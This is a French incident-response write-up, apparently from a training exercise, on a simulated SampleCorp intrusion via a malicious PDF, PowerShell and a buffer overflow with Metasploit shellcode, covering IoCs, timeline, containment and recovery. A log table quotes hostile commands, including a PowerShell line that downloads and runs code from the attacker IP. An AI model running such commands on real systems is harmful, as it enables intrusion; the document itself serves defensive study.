
- L'utilisateur a accédé à sa messagerie via le client **Mozilla Thunderbird**.
- Le fichier **cv.pdf**, jugé suspect, a été ouvert avec **Adobe Reader 10.0**, une version obsolète présentant des vulnérabilités connues.
- Des commandes malveillantes ont été enregistrées immédiatement après ces actions, suggérant un lien direct avec l’ouverture du fichier.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%207.png)
    
    De plus, cmd.exe et powershell.exe ont été générés à partir de wmiprvse.exe.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%208.png)
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%209.png)
    
    Comme déjà mentionné, l’entité non autorisée a ensuite exécuté des commandes PowerShell spécifiques.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2010.png)
    
    **Analyse succincte de l’adresse IP 192.168.220.66**
    
    L’analyse des journaux a permis d’identifier quatre hôtes actifs sur le segment réseau, chacun associé à une adresse IP et un nom de machine. L’hôte **192.168.220.66**, précédemment repéré dans les journaux de **WKST01.samplecorp.com**, confirme la présence d’un acteur non autorisé au sein du réseau interne.
    
    | Adresse IP | Nom d’hôte |
    | --- | --- |
    | 192.168.220.20 | DC01.samplecorp.com |
    | 192.168.220.200 | WKST01.samplecorp.com |
    | 192.168.220.101 | HR01.samplecorp.com |
    | 192.168.220.202 | ENG01.samplecorp.com |
    
    Le tableau ci-dessous présente les résultats d’une requête SIEM visant à identifier les exécutions de commandes initiées depuis l’adresse **192.168.220.66**, sur la base des journaux collectés à partir de **WKST01.samplecorp.com** :
    
    | Commande exécutée | Hôte cible | Nombre d’occurrences |
    | --- | --- | --- |
    | `cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1` | WKST01 | 5 |
    | `cmd.exe /Q /c dir 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1` | WKST01 | 4 |
    | `powershell.exe -nop -w hidden -c $c=new-object net.webclient;...;IEX` | WKST01 | 2 |
    | `whoami` | WKST01 | 1 |
    | `powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.220.66/test.php'); $m = Get-ModifiableService;` | HR01 | 1 |
    
    Ces résultats indiquent que l’entité non autorisée a réussi à infiltrer les systèmes **WKST01.samplecorp.com** et **HR01.samplecorp.com**.
    
    **HR01.samplecorp.com**
    
    Une attention particulière a ensuite été portée à **HR01.samplecorp.com**, car les captures réseau montrent que l’adresse **192.168.220.66** a tenté d’établir une connexion avec ce système dès les premières phases de l’activité malveillante. Cela renforce l’hypothèse d’une compromission planifiée et coordonnée entre plusieurs hôtes internes.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2011.png)
    
    Les détails du trafic réseau indiquent une tentative d'exploitation par dépassement de tampon ciblant le service actif sur le port **31337** de **HR01.samplecorp.com**.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2012.png)
    

Le trafic réseau a été exporté sous forme de binaire brut pour une analyse plus approfondie.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2013.png)

Le binaire extrait a été analysé dans un débogueur de shellcode, scdbg.

Scdbg révèle que le shellcode tentera d'établir une connexion à 192.168.220.66 sur le port 4444. Cela confirme une tentative d'exploitation d'un service exécuté sur le port 31337 de [HR01.samplecorp.com](http://hr01.samplecorp.com/).

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2014.png)

Une recherche de connexions réseau entre [HR01.samplecorp.com](http://hr01.samplecorp.com/) et l'entité non autorisée a été effectuée à l'aide du fichier de capture de trafic susmentionné. Les résultats ont révélé des connexions vers l'entité non autorisée sur le port 4444. Cela indique que l'entité non autorisée a exploité avec succès une vulnérabilité de dépassement de mémoire tampon pour obtenir l'exécution de commandes sur [HR01.samplecorp.com](http://hr01.samplecorp.com/).

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2015.png)

### **Adaptation de la profondeur de l’analyse technique**

La profondeur de l’analyse technique peut être ajustée afin de garantir que l’ensemble des parties prenantes soient correctement informées de l’incident et des mesures prises en réponse. Bien que nous ayons volontairement condensé les détails de l’enquête dans ce module afin de ne pas vous submerger, il est important de noter que, dans un contexte réel, chaque affirmation serait étayée par des preuves solides et vérifiables.

---

### **Indicateurs de Compromission (IoCs)**

- **Adresse IP de Command & Control (C2)** : 192.168.220.66
- **Fichier malveillant** : `cv.pdf`
    - **Empreinte SHA256** : `ef59d7038cfd565fd65bae12588810d5361df938244ebad33b71882dcf683011`

---

### **Analyse des Causes Racines**

L'accès non autorisé au réseau interne de SampleCorp a été rendu possible par l'absence de contrôles d’accès réseau adéquats.

Deux vulnérabilités majeures ont été identifiées comme causes principales de l’incident :

1. **Utilisation d’une version obsolète d’Adobe Acrobat Reader**, connue pour ses failles de sécurité.
2. **Présence d’une vulnérabilité de type dépassement de tampon** dans une application propriétaire.

Ces failles ont été aggravées par un manque de cloisonnement réseau entre les systèmes critiques, facilitant la propagation de l’attaque. En parallèle, l’absence de formation des utilisateurs face aux techniques de phishing a également été un facteur de compromission.

---

### **Chronologie Technique de l’Incident**

### **Compromission initiale**

- **22 avril 2019, 00:27:27** : Un employé ouvre le fichier malveillant `cv.pdf` sur **WKST01.samplecorp.com**, exploitant une vulnérabilité dans une version obsolète d’Acrobat Reader. Cela déclenche l’exécution d’un code malveillant qui permet une première prise de contrôle.

### **Mouvement latéral**

- **22 avril 2019, 00:50:18** : L’entité malveillante réalise une reconnaissance du réseau interne. Elle identifie une vulnérabilité de type buffer overflow dans une application RH propriétaire sur **HR01.samplecorp.com** et l’exploite pour accéder à ce système.

### **Accès aux données & exfiltration**

- **22 avril 2019, 00:35:09** : L’intrus accède à plusieurs répertoires sur **WKST01** contenant du code source propriétaire et des clés API.
- **22 avril 2019, 01:30:12** : Il découvre une base de données non chiffrée sur **HR01** contenant des données sensibles (NIR, salaires, etc.), qu’il compresse puis exfiltre vers un serveur externe via un tunnel SSH sécurisé.

### **Communications avec le serveur C2**

- L’entité malveillante a obtenu un accès physique au réseau interne. Le serveur de commande et de contrôle (C2) identifié utilisait l’adresse IP interne **192.168.220.66**.

### **Déploiement ou activité de logiciels malveillants**

- Le malware a été diffusé via un fichier PDF malveillant et a utilisé des binaires Windows légitimes pour l’exécution de commandes et l’exploitation post-compromission.
- Du code shell (shellcode) a ensuite été injecté dans le cadre du buffer overflow pour infecter **HR01.samplecorp.com**.

---

### **Phases de Contention**

- **22 avril 2019, 02:30:11** : Les équipes SOC et DFIR isolent immédiatement les machines **WKST01** et **HR01** via segmentation VLAN.
- **03:10:14** : Installation d’une solution de sécurité sur les deux hôtes pour collecter davantage de données.
- **03:43:34** : Mise à jour des règles du pare-feu pour bloquer l’IP C2 identifiée et couper l’accès distant de l’attaquant.

---

### **Phases d’Éradication**

- **04:11:00** : Utilisation d’un outil spécialisé de suppression de malware sur **WKST01** et **HR01**.
- **04:30:00** : Mise à jour d’Acrobat Reader sur toutes les machines concernées pour corriger la vulnérabilité initiale.
- **05:01:08** : Révocation des clés API compromises.
- **05:05:08** : Réinitialisation des identifiants des utilisateurs concernés.

---

### **Phases de Rétablissement**

- **05:21:20** : Restauration de **WKST01** à partir d’une sauvegarde validée.
- **05:58:50** : Restauration de **HR01** suivant la même procédure.
- **06:33:44** : Déploiement d’un correctif d’urgence sur l’application RH pour combler la vulnérabilité de type buffer overflow.

---

### **Nature de l’Attaque**

Cette section vise à examiner en détail le mode opératoire de l’acteur malveillant, en analysant les tactiques, techniques et procédures (TTPs) utilisées tout au long de l’intrusion. Par exemple, nous avons étudié la manière dont l’équipe SOC a pu déterminer que l’entité non autorisée avait recours au **framework Metasploit**.

---

### **Détection de Metasploit**

Pour mieux comprendre les méthodes employées, une attention particulière a été portée sur les commandes **PowerShell** malveillantes exécutées, notamment celle visible dans la capture d’écran suivante.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2016.png)

Après inspection, il est apparu clairement qu'un double codage avait été utilisé, probablement pour contourner les mécanismes de détection. L'équipe SOC a réussi à décoder la charge utile malveillante, révélant le code PowerShell exact exécuté dans la mémoire de [WKST01.samplecorp.com](http://wkst01.samplecorp.com/).

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2017.png)

En exploitant les renseignements open source, notre équipe SOC a déterminé que ce code PowerShell est probablement lié au framework de post-exploitation Metasploit.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2018.png)

Pour étayer notre hypothèse d'utilisation de Metasploit, nous avons analysé en profondeur le shellcode détecté. Nous avons exporté les octets du paquet contenant le shellcode (au format .bin) et les avons ensuite soumis à VirusTotal pour évaluation.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2019.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2020.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2021.png)

### **Confirmation de l’utilisation de Metasploit**

Les résultats fournis par **VirusTotal** ont confirmé nos soupçons concernant l’usage de **Metasploit**. Les artefacts tels que `metacoder` et `shikata`, détectés dans les charges utiles, sont intrinsèquement liés au shellcode généré par ce framework de post-exploitation.

---

### **Analyse de l'Impact**

Dans cette section, une analyse approfondie des impacts sur les parties prenantes est essentielle, en tenant compte de la structure interne spécifique de l’entreprise, de son environnement commercial et de ses obligations réglementaires. Cette évaluation vise à cerner les répercussions de l’incident sur toutes les entités concernées.

---

### **Analyse de la Réponse et de la Récupération**

### **Mesures de Réponse Immédiate**

**Révocation des Accès :**

- **Identification des systèmes et comptes compromis :** Grâce à la solution SIEM d’Elastic, des activités suspectes ont été détectées sur **WKST01.samplecorp.com**. Une analyse des journaux et du trafic réseau a ensuite révélé une compromission de **HR01.samplecorp.com**.
- **Période :** Les activités malveillantes ont été détectées le **22 avril 2019 à 01:05:00**. L’accès a été révoqué à **03:43:34**, suite à la mise à jour des règles du pare-feu bloquant l’IP du serveur C2.
- **Méthode de révocation :** En complément du blocage via pare-feu, des politiques Active Directory ont été mises en œuvre pour forcer la déconnexion des sessions suspectes. Les identifiants utilisateurs compromis ont été réinitialisés et les clés API concernées ont été révoquées.
- **Impact :** Cette action rapide a permis d’arrêter tout mouvement latéral potentiel et de prévenir une compromission plus étendue.

### **Stratégie de Confinement**

- **Mesures à court terme :** Une segmentation VLAN a été immédiatement appliquée pour isoler les hôtes compromis (**WKST01** et **HR01**) du reste du réseau, limitant ainsi la propagation de l’attaque.
- **Mesures à long terme :** Des plans ont été établis pour renforcer la segmentation réseau, en cloisonnant les services critiques et en limitant l'accès aux seuls équipements autorisés.
- **Efficacité :** La stratégie a été efficace, empêchant toute élévation de privilège ou mouvement vers d'autres systèmes.

### **Mesures d'Éradication**

**Suppression du Malware :**

- **Identification :** Des processus suspects ont été détectés sur les hôtes infectés. L’analyse forensique a révélé la présence de composants typiques de Metasploit, confirmée par VirusTotal.
- **Suppression :** Un outil spécialisé a été utilisé pour éradiquer toutes les charges malveillantes identifiées sur **WKST01** et **HR01**.
- **Vérification :** Des analyses supplémentaires, incluant des méthodes heuristiques, ont été menées pour s’assurer de l’absence de résidus malveillants.

**Mise à jour des Systèmes :**

- **Identification des vulnérabilités :** Deux vulnérabilités ont été exploitées : une faille connue dans une version obsolète d’Acrobat Reader et un **buffer overflow** dans une application RH propriétaire.
- **Gestion des correctifs :** Acrobat Reader a été mis à jour sur tous les postes. Un patch d'urgence a également été développé et déployé sur l’application RH vulnérable (**HR01**).
- **Procédures de repli :** Des sauvegardes système ont été réalisées avant chaque mise à jour pour permettre un retour rapide en cas d’instabilité.

---

### **Étapes de Récupération**

**Restauration des Données :**

- **Validation des sauvegardes :** Des contrôles d’intégrité ont été réalisés via comparaison de checksums avant toute restauration.
- **Processus de restauration :** Les systèmes ont été restaurés à partir de sauvegardes validées par l’équipe SOC.
- **Vérification de l’intégrité :** Des hachages cryptographiques (SHA-256) ont été générés pour s'assurer de l'authenticité des données restaurées.

**Validation des Systèmes :**

- **Mesures de sécurité :** Les pare-feux et les systèmes de détection d’intrusion ont été mis à jour avec les derniers IoCs identifiés.
- **Tests opérationnels :** Avant la remise en production, des tests de charge et de stabilité ont été réalisés.

---

### **Actions Post-Incident**

**Surveillance Renforcée :**

- **Nouveau plan de supervision :** Mise en place d’une surveillance comportementale visant à détecter toute anomalie par rapport à un profil d’activité normal.
- **Outils utilisés :** Le SIEM Elastic sera configuré avec de nouvelles règles de corrélation pour identifier les TTPs associés à cet incident.

**Retour d’Expérience :**

- **Analyse des lacunes :** L’incident a mis en lumière des faiblesses concernant les contrôles d'accès, le filtrage des e-mails, la segmentation réseau et la sensibilisation aux attaques par hameçonnage.
- **Recommandations :** Prioriser la gestion des actifs, le filtrage des courriels et le renforcement de la formation à la cybersécurité.
- **Stratégie future :** Adopter une approche **Zero Trust**, segmenter plus finement le réseau, et investir davantage dans la formation et les outils de protection préventive.

---

### **Annexe A – Chronologie Technique**

| Heure | Événement |
| --- | --- |
| 22 avril 2019, 00:27:27 | Un employé ouvre un fichier PDF malveillant (`cv.pdf`) sur **WKST01**, exploitant une faille Acrobat Reader. Une charge utile s'exécute, établissant un premier point d’ancrage. |
| 22 avril 2019, 00:35:09 | Accès non autorisé à des répertoires contenant du code source et des clés API. |
| 22 avril 2019, 00:50:18 | L’attaquant effectue une reconnaissance et identifie un buffer overflow dans l’application RH de **HR01**, qu’il exploite. |
| 22 avril 2019, 01:30:12 | Accès à une base de données non chiffrée contenant des données sensibles, exfiltrées via un tunnel SSH. |
| 22 avril 2019, 02:30:11 | Isolement de **WKST01** et **HR01** via segmentation VLAN. |
| 22 avril 2019, 03:10:14 | Déploiement de solutions de sécurité pour collecter plus d’informations sur les hôtes compromis. |
| 22 avril 2019, 03:43:34 | Blocage de l’IP C2 via les règles du pare-feu. |
| 22 avril 2019, 04:11:00 | Suppression du malware avec un outil spécialisé. |
| 22 avril 2019, 04:30:00 | Mise à jour d’Acrobat Reader sur toutes les machines. |
| 22 avril 2019, 05:01:08 | Révocation des clés API compromises. |
| 22 avril 2019, 05:05:08 | Réinitialisation des identifiants des utilisateurs affectés. |
| 22 avril 2019, 05:21:20 | Restauration de **WKST01** depuis une sauvegarde vérifiée. |
| 22 avril 2019, 05:58:50 | Restauration de **HR01** depuis une sauvegarde vérifiée. |
| 22 avril 2019, 06:33:44 | Déploiement du correctif pour la vulnérabilité buffer overflow de l’application RH. |
</aside>

<aside>
💡

**p4r3553                                                                  6/05/25**

        

</aside>